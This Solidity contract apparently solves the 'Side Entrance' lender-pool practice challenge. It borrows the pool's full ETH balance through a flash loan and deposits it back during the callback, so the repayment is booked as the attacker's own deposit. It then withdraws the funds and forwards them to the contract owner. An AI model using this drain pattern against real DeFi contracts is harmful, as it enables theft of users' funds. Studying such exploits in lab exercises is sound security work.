// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceHack {
    SideEntranceLenderPool public lenderPool;
    address payable owner;

    constructor(SideEntranceLenderPool _lenderPool) {
        lenderPool = _lenderPool;
        owner = payable(msg.sender);
    }

    function attack() external {
        uint256 amount = address(lenderPool).balance;
        lenderPool.flashLoan(amount);
        //lender calls execute() with `amount` value.
        //then withdraw
        lenderPool.withdraw();
    }

    function execute() external payable {
        lenderPool.deposit{value: msg.value}();
    }

    receive() external payable {
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }
}
